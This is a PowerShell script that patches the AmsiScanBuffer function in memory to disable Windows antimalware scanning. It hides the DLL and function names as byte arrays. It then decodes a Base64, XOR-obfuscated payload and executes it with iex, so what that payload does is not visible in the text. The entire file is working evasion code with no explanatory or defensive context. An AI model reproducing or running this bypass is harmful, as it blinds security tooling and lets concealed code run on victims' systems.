
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "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MTExMTExNUFwZXJ5dHUxOiwxNVJ+fGFkZXRjHBsxMTExbBwbMTExMVR9YnQcGzExMTFqHBsxMTExMTE1RH9hcGVyeXR1MTosMTVSfnxhZGV0YxwbMTExMTExMzs7Ozs7cWU1Un58YWRldGMxWEIxRF9BUEVSWVRVMDE7Ozs7OzMxbV5kZTxXeH10MTxXeH10QXBleTE1fX52MTxQYWF0f3UcGzExMTFsHBsxMWwcGzExcnBlcnkcGzExahwbMTExMTVed3dSfnxhZGV0Y2IxOiwxNVJ+fGFkZXRjHBsxMTExMzs7OztxZTVSfnxhZGV0YzFxZUR/cHN9dDFlfjFyfn9/dHJlPzMxbV5kZTxXeH10MTxXeH10QXBleTE1fX52MTxQYWF0f3UcGzExbBwbbBwbNjE2HBszQmR8fHBjaDF3fmMxdX58cHh/KzE1VF9HK0RCVENVX0JVXlxQWF8zHBszRH9hcGVyeXR1MTk1OTVEf2FwZXJ5dHU/cn5kf2U4OCszMW1eZGU8V3h9dDE8V3h9dEFwZXkxNX1+djE8UGFhdH91HBs1RH9hcGVyeXR1MTx7fnh/MTk2PTE2ODExbV5kZTxXeH10MTxXeH10QXBleTE1fX52MTxQYWF0f3UcGzY2MW1eZGU8V3h9dDE8V3h9dEFwZXkxNX1+djE8UGFhdH91HBszQXBlcnl0dTE5NTk1QXBlcnl0dT9yfmR/ZTg4KzMxbV5kZTxXeH10MTxXeH10QXBleTE1fX52MTxQYWF0f3UcGzVBcGVyeXR1MTx7fnh/MTk2PTE2ODFtXmRlPFd4fXQxPFd4fXRBcGV5MTV9fnYxPFBhYXR/dRwbNjYxbV5kZTxXeH10MTxXeH10QXBleTE1fX52MTxQYWF0f3UcGzNed3c+RH9ldGJldHU5NTk5NV53d1J+fGFkZXRjYjE6MTVSeXRyeldweH04P3J+ZH9lODgrM21eZGU8V3h9dDE8V3h9dEFwZXkxNX1+djE8UGFhdH91HBs5NV53d1J+fGFkZXRjYjE6MTVSeXRyeldweH0xbTFCfmNlPF5ze3RyZTg8e354fzE5Nj0xNjhtXmRlPFd4fXQxPFd4fXRBcGV5MTV9fnYxPFBhYXR/dRwbHBszXncxZXl0MTU5NUZ4f3V+ZmJSfnxhZGV0Y2I/cn5kf2U4MWZ4f3V+ZmIxcn58YWRldGNiMXh/MXByZXhndDF1eGN0cmV+Y2g9MTU5NV53d1J+fGFkZXRjYj9yfmR/ZTgxZnRjdDF+d3c9MTU5NVJ5dHJ6V3B4fT9yfmR/ZTgxcn5kfXV/NmUxc3Qxcnl0cnp0dT0xNTk1RH9hcGVyeXR1P3J+ZH9lODFmdGN0MWR/YXBlcnl0dTFwf3UxNTk1QXBlcnl0dT9yfmR/ZTgxZnRjdDFiZHJydGJid2R9fWgxYXBlcnl0dT8zHBs2V2R9fTF1dGVweH1iMXh/MWV5dDF9fnYxd3h9dD82HBscG2VjaBwbahwbMTFCZXBjZTxBY35ydGJiMTxXeH10QXBleTF/fmV0YXB1OjoxPFBjdmR8dH9lXXhiZTE1fX52HBtsHBtycGVyeRwbahwbMTFCZXBjZTxBY35ydGJiMTxXeH10QXBleTF/fmV0YXB1P3RpdDE8UGN2ZHx0f2VdeGJlMTV9fnYcG2w="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x11}
iex ([System.Text.Encoding]::ASCII.GetString($data))

